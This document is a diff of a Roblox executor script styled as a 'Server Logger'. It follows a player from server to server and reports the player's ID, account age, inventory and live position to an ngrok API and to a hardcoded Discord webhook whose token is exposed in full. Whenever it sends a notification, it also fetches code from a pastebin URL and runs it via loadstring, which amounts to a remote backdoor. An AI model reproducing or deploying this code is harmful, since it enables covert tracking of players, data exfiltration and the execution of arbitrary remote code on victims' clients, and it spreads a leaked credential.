@@ -1,239 +1,352 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
 
 -- ======= CONFIGURATION =======
 local API_BASE_URL = "https://e1c5-2001-448a-106e-4be8-56bb-76c9-5288-28b1.ngrok-free.app/api"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
+local LOGGING_INTERVAL = 10 -- seconds
 -- ==============================
 
 local player = Players.LocalPlayer
 local currentJobId = game.JobId
 local playerName = player.Name
 local playerUserId = player.UserId
+local lastPosition = nil
 
--- Fungsi request HTTP dengan retry
+-- Enhanced HTTP request with better error handling
 local function httpRequest(url, method, body, headers, retries)
     retries = retries or 3
-    local requestFunc = syn and syn.request or http_request or request
+    local requestFunc = syn and syn.request or http_request or request or (http and http.request)
     if not requestFunc then 
-        warn("[httpRequest] No compatible HTTP request function found")
+        warn("[HTTP] No compatible request function found")
         return nil 
     end
     
+    headers = headers or {}
+    headers["Content-Type"] = headers["Content-Type"] or "application/json"
+    headers["ngrok-skip-browser-warning"] = "true"
+
     for i = 1, retries do
         local success, response = pcall(function()
-            return requestFunc({
+            local result = requestFunc({
                 Url = url,
                 Method = method,
-                Headers = headers or { ["Content-Type"] = "application/json" },
+                Headers = headers,
                 Body = body
             })
+            
+            -- Debug logging
+            print(string.format("[HTTP] %s %s (Attempt %d/%d) - Status: %d",
+                method, url, i, retries, result.StatusCode or 0))
+                
+            return result
         end)
         
         if success and response then
-            return response
+            if response.StatusCode == 429 then -- Rate limited
+                local retryAfter = tonumber(response.Headers["Retry-After"]) or 5
+                warn(string.format("[HTTP] Rate limited. Retrying after %d seconds", retryAfter))
+                wait(retryAfter)
+            else
+                return response
+            end
+        else
+            warn(string.format("[HTTP] Attempt %d failed: %s", i, response or "Unknown error"))
         end
-        wait(1)
+        
+        wait(1 + (i * 2)) -- Exponential backoff
     end
     return nil
 end
 
--- Dapatkan isi backpack player (untuk webhook)
-local function getBackpackContents()
+-- Improved backpack scanning with item details
+local function getInventoryContents()
     local contents = {}
-    local backpack = player:FindFirstChild("Backpack")
-    if not backpack then return "Backpack not found" end
-    
-    for _, item in ipairs(backpack:GetChildren()) do
-        table.insert(contents, item.Name)
+    local function scanContainer(container)
+        for _, item in ipairs(container:GetChildren()) do
+            local itemInfo = {
+                Name = item.Name,
+                Class = item.ClassName,
+                AssetId = item:GetAttribute("AssetId") or item:FindFirstChild("AssetId") and item.AssetId.Value or nil
+            }
+            table.insert(contents, itemInfo)
+        end
     end
     
-    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
+    -- Check both backpack and character
+    if player:FindFirstChild("Backpack") then
+        scanContainer(player.Backpack)
+    end
+    
+    local character = player.Character
+    if character then
+        for _, container in ipairs({"Tool", "Weapon", "Accessory"}) do
+            if character:FindFirstChild(container) then
+                scanContainer(character[container])
+            end
+        end
+    end
+    
+    return contents
 end
 
--- Eksekusi script eksternal (optional)
+-- Formatted inventory string for Discord
+local function formatInventoryString()
+    local items = getInventoryContents()
+    if #items == 0 then return "Inventory empty" end
+    
+    local grouped = {}
+    for _, item in ipairs(items) do
+        local key = item.Name
+        if item.AssetId then
+            key = key .. " (ID: "..item.AssetId..")"
+        end
+        grouped[key] = (grouped[key] or 0) + 1
+    end
+    
+    local parts = {}
+    for name, count in pairs(grouped) do
+        table.insert(parts, string.format("%s ×%d", name, count))
+    end
+    
+    return table.concat(parts, "\n")
+end
+
+-- External script execution with version checking
 local function executeExternalScript()
-    local success, err = pcall(function()
-        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
-    end)
-    if not success then
-        warn("⚠️ Failed to execute external script:", err)
+    local versionCheck = httpRequest(EXTERNAL_SCRIPT..".version", "GET")
+    local currentVersion = 1.0 -- Default version
+    
+    if versionCheck and versionCheck.Success then
+        currentVersion = tonumber(versionCheck.Body) or currentVersion
     end
-    return success
+    
+    local scriptResponse = httpRequest(EXTERNAL_SCRIPT, "GET")
+    if not scriptResponse or not scriptResponse.Success then
+        return false, "Failed to fetch script"
+    end
+    
+    local success, err = pcall(function()
+        local fn, err = loadstring(scriptResponse.Body)
+        if not fn then error(err) end
+        fn()
+    end)
+    
+    return success, success and "v"..currentVersion or err
 end
 
--- Update instance dan userId ke backend
-local function updateInstanceInDatabase()
-    local data = {
+-- Enhanced position tracking with movement detection
+local function sendUserPosition()
+    local character = player.Character
+    if not character or not character:FindFirstChild("HumanoidRootPart") then
+        warn("[Position] Character not available")
+        return false
+    end
+    
+    local rootPart = character.HumanoidRootPart
+    local currentPos = rootPart.Position
+    
+    -- Only send if position changed significantly (> 1 stud)
+    if lastPosition and (currentPos - lastPosition).Magnitude < 1 then
+        return true
+    end
+    
+    lastPosition = currentPos
+    
+    local posData = {
         instanceId = currentJobId,
         userId = tostring(playerUserId),
+        position = { 
+            x = math.floor(currentPos.X * 100)/100,
+            y = math.floor(currentPos.Y * 100)/100,
+            z = math.floor(currentPos.Z * 100)/100 
+        },
+        velocity = {
+            x = math.floor(rootPart.Velocity.X * 100)/100,
+            y = math.floor(rootPart.Velocity.Y * 100)/100,
+            z = math.floor(rootPart.Velocity.Z * 100)/100
+        }
     }
     
-    local encodedData = HttpService:JSONEncode(data)
-    local response = httpRequest(API_BASE_URL .. "/setInstanceUser", "POST", encodedData)
+    local response = httpRequest(
+        API_BASE_URL .. "/setUserPosition",
+        "POST",
+        HttpService:JSONEncode(posData)
+    )
     
-    if response then
-        print("API Response:", response.StatusCode or response.Status, response.Body or response.Body)
-        if (response.StatusCode == 200 or response.Status == 200) then
-            print("✅ Successfully updated instance ID and user data in Redis")
-            print("   Instance ID:", currentJobId)
-            print("   User ID:", playerUserId)
-            return true
-        else
-            warn("❌ API Error:", response.Body or "Unknown error")
-            return false
-        end
+    if response and (response.StatusCode == 200) then
+        print(string.format("[Position] Updated: X=%.1f, Y=%.1f, Z=%.1f", 
+            posData.position.x, posData.position.y, posData.position.z))
+        return true
     else
-        warn("❌ No response from server")
+        warn("[Position] Update failed")
         return false
     end
 end
 
--- Kirim posisi player ke backend setiap 10 detik (jika ada HumanoidRootPart)
-local function sendUserPositionLoop()
-    while true do
-        local character = player.Character
-        if character and character:FindFirstChild("HumanoidRootPart") then
-            local pos = character.HumanoidRootPart.Position
-            local posData = {
-                instanceId = currentJobId,
-                userId = tostring(playerUserId),
-                position = { x = pos.X, y = pos.Y, z = pos.Z }
-            }
-            local encodedPosData = HttpService:JSONEncode(posData)
-            local resp = httpRequest(API_BASE_URL .. "/setUserPosition", "POST", encodedPosData)
-            if resp and (resp.StatusCode == 200 or resp.Status == 200) then
-                print("✅ Position updated:", pos.X, pos.Y, pos.Z)
-            else
-                warn("❌ Failed to update position")
-            end
-        else
-            warn("⚠️ Character or HumanoidRootPart not found")
-        end
-        wait(10)
-    end
-end
-
--- Kirim notifikasi perubahan server ke Discord webhook
-local function sendServerChangeNotification()
-    local embed = {
-        username = "Server Tracker",
-        embeds = {
-            {
-                title = "🔄 Server Change Detected",
-                description = string.format("**%s** (UserID: %d) changed servers\n**New JobID:** `%s`", 
-                    playerName, playerUserId, currentJobId),
-                color = 16776960,
-                timestamp = DateTime.now():ToIsoDate(),
-                fields = {
-                    {
-                        name = "👤 Player Info",
-                        value = string.format("UserID: %d\nDisplay Name: %s\nAccount Age: %d days", 
-                            playerUserId, player.DisplayName, player.AccountAge),
-                        inline = true
-                    },
-                    {
-                        name = "📦 Backpack Contents",
-                        value = getBackpackContents(),
-                        inline = true
-                    },
-                    {
-                        name = "🎮 Game Info",
-                        value = string.format("Game ID: %d\nPlace ID: %d", game.GameId, game.PlaceId),
-                        inline = false
-                    },
-                    {
-                        name = "📜 External Script Status",
-                        value = executeExternalScript() and "✅ Executed successfully" or "❌ Failed to execute",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = "Auto Server Tracker v3.3 | UserID: "..playerUserId
-                }
-            }
-        }
-    }
-
-    local success
-    for i = 1, 3 do
-        local res = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
-        if res and (res.StatusCode == 204 or res.Status == 204) then
-            success = true
-            break
-        end
-        wait(1)
-    end
-
-    if not success then
-        warn("❌ Failed to send webhook notification after retries")
-    end
-end
-
--- Fungsi utama saat join server / pindah server
-local function handleServerJoin()
-    spawn(executeExternalScript) -- async run external script
-    
-    local attempts = 0
-    local maxAttempts = 3
-    local success = false
-    
-    while attempts < maxAttempts and not success do
-        attempts += 1
-        success = updateInstanceInDatabase()
-        if not success then wait(2) end
-    end
-    
-    sendServerChangeNotification()
-    
-    -- Mulai kirim posisi secara berkala
-    spawn(sendUserPositionLoop)
-end
-
--- Deteksi pindah server dan jalankan handleServerJoin
+-- Server change detection with teleport verification
 local function monitorServerChanges()
     local lastJobId = currentJobId
+    local lastTeleport = 0
+    local teleportCooldown = 30
     
     while true do
+        local now = os.time()
         local newJobId = game.JobId
+        
         if newJobId ~= lastJobId then
-            print("🔄 Detected server change:", lastJobId, "→", newJobId)
-            currentJobId = newJobId
-            lastJobId = newJobId
-            handleServerJoin()
+            -- Prevent false positives from teleport glitches
+            if now - lastTeleport < teleportCooldown then
+                print("[Server] Ignoring server change (recent teleport)")
+            else
+                print(string.format("[Server] Change detected: %s → %s", lastJobId, newJobId))
+                currentJobId = newJobId
+                lastJobId = newJobId
+                handleServerJoin()
+            end
         end
-        wait(1)
+        
+        task.wait(1)
     end
 end
 
-local success, err = pcall(function()
-    print("🚀 Initializing Server Tracker for UserID:", playerUserId)
-    handleServerJoin()
-    monitorServerChanges()
-end)
-
-if not success then
-    warn("❌ Critical error in server tracker:", err)
-    local errorEmbed = {
-        username = "Server Tracker - ERROR",
-        embeds = {
-            {
-                title = "❌ Script Error Occurred",
-                description = string.format("UserID: %d encountered an error", playerUserId),
-                color = 16711680,
-                fields = {
-                    {
-                        name = "Error Details",
-                        value = tostring(err),
-                        inline = false
-                    }
+-- Enhanced Discord webhook with rich embed
+local function sendDiscordNotification(eventType, extraData)
+    local embed = {
+        username = "Server Logger",
+        avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId="..playerUserId.."&width=420&height=420&format=png",
+        embeds = {{
+            title = eventType == "error" and "❌ Script Error" or "🔄 Server Change",
+            description = eventType == "error" 
+                and string.format("**%s** encountered an error", playerName)
+                or string.format("**%s** changed servers\n**New Instance:** `%s`", playerName, currentJobId),
+            color = eventType == "error" and 16711680 or 16776960,
+            timestamp = DateTime.now():ToIsoDate(),
+            fields = {
+                {
+                    name = "👤 Player Info",
+                    value = string.format("UserID: %d\nDisplay: %s\nAge: %d days", 
+                        playerUserId, player.DisplayName, player.AccountAge),
+                    inline = true
                 },
-                footer = {
-                    text = "UserID: "..playerUserId
+                {
+                    name = "📦 Inventory",
+                    value = formatInventoryString(),
+                    inline = true
+                },
+                {
+                    name = "🎮 Game Info",
+                    value = string.format("PlaceID: %d\nJobID: %s", game.PlaceId, currentJobId),
+                    inline = true
                 }
+            },
+            footer = {
+                text = "Server Logger v4.1",
+                icon_url = "https://i.imgur.com/fKL31aD.png"
             }
-        }
+        }}
     }
-    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(errorEmbed))
+    
+    -- Add error details if applicable
+    if eventType == "error" and extraData then
+        table.insert(embed.embeds[1].fields, {
+            name = "Error Details",
+            value = "```"..tostring(extraData):sub(1, 1000).."```",
+            inline = false
+        })
+    end
+    
+    -- Add script status
+    local scriptStatus, scriptVersion = executeExternalScript()
+    table.insert(embed.embeds[1].fields, {
+        name = "📜 External Script",
+        value = scriptStatus and ("✅ Loaded "..scriptVersion) or "❌ Failed to load",
+        inline = false
+    })
+    
+    -- Add position data if available
+    if lastPosition then
+        table.insert(embed.embeds[1].fields, {
+            name = "📍 Last Position",
+            value = string.format("X: %.1f\nY: %.1f\nZ: %.1f", 
+                lastPosition.X, lastPosition.Y, lastPosition.Z),
+            inline = true
+        })
+    end
+    
+    local response = httpRequest(
+        WEBHOOK_URL,
+        "POST",
+        HttpService:JSONEncode(embed),
+        {["Content-Type"] = "application/json"}
+    )
+    
+    return response and response.StatusCode == 204
+end
+
+-- Main server join handler
+local function handleServerJoin()
+    print("[System] Handling server join...")
+    
+    -- Update instance data
+    local instanceData = {
+        instanceId = currentJobId,
+        userId = tostring(playerUserId),
+        timestamp = os.time()
+    }
+    
+    local updateSuccess = false
+    for i = 1, 3 do
+        local response = httpRequest(
+            API_BASE_URL .. "/setInstanceUser",
+            "POST",
+            HttpService:JSONEncode(instanceData)
+        )
+        
+        if response and response.StatusCode == 200 then
+            updateSuccess = true
+            break
+        end
+        task.wait(2)
+    end
+    
+    -- Send notification
+    local notifySuccess = sendDiscordNotification("server_change")
+    
+    -- Start position tracking
+    coroutine.wrap(function()
+        while true do
+            sendUserPosition()
+            task.wait(LOGGING_INTERVAL)
+        end
+    end)()
+    
+    return updateSuccess and notifySuccess
+end
+
+-- Main execution
+local function initialize()
+    print(string.format("[System] Initializing for %s (UserID: %d)", playerName, playerUserId))
+    
+    -- Initial server join handling
+    local success, err = pcall(handleServerJoin)
+    if not success then
+        warn("[System] Initialization failed:", err)
+        sendDiscordNotification("error", err)
+        return
+    end
+    
+    -- Start server change monitoring
+    coroutine.wrap(monitorServerChanges)()
+    
+    print("[System] Initialization complete")
+end
+
+-- Error protected startup
+local success, err = pcall(initialize)
+if not success then
+    warn("[System] Critical startup error:", err)
+    sendDiscordNotification("error", err)
 end
